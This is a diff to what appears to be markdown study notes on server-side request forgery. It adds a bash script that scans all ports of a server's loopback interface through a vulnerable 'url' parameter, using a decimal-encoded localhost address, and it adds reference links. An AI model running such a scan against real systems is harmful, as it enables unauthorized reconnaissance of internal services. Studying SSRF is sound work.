@@ -22,6 +22,17 @@ availabilityApi=http://127.0.0.1/admin
 ```
 Here, instead of making a request with legitimate url, the attacker calls the admin page on the loopback address.Because the request is coming from the server itself which is trusted, the page is served without complaint.
 
+SSRF Port Scanning Bash Script (GET)
+```
+#!/bin/bash
+for x in {1..65535};
+	do cmd=$(curl -so /dev/null http://10.10.93.91:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
+	if [ $cmd != 1045 ]; then
+		echo "Open port: $x"
+	fi
+	
+done
+```
 
 ### References
 ```
@@ -30,3 +41,5 @@ https://medium.com/@adithyakrishnav001/server-side-request-forgery-ssrf-bf23802c
 ```
 https://www.imperva.com/learn/application-security/server-side-request-forgery-ssrf/
 ```
+
+
